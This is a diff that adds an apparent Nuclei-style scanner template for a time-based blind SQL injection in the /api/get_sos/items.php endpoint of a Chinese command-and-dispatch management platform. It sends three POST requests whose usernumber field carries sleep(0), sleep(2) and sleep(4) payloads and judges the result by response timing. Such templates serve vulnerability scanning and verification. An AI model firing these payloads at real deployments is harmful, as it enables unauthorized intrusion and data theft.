@@ -1,0 +1,41 @@
+id: zhihuidiaodu-items-sqli
+
+info:
+  name: 指挥调度管理平台 items.php SQL注入
+  author: SleepingBag945
+  severity: high
+  tags: 指挥调度管理平台
+
+
+
+http:
+  - raw:
+      - |              
+        POST /api/get_sos/items.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1%27and%28select%2Afrom%28select%2Bsleep%280%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
+
+      - |              
+        POST /api/get_sos/items.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1%27and%28select%2Afrom%28select%2Bsleep%282%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
+
+      - |              
+        POST /api/get_sos/items.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1%27and%28select%2Afrom%28select%2Bsleep%284%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
+
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=0  && duration_1<=2"
+          - "duration_2>=2  && duration_2<=4"
+          - "duration_3>=4  && duration_3<=6"
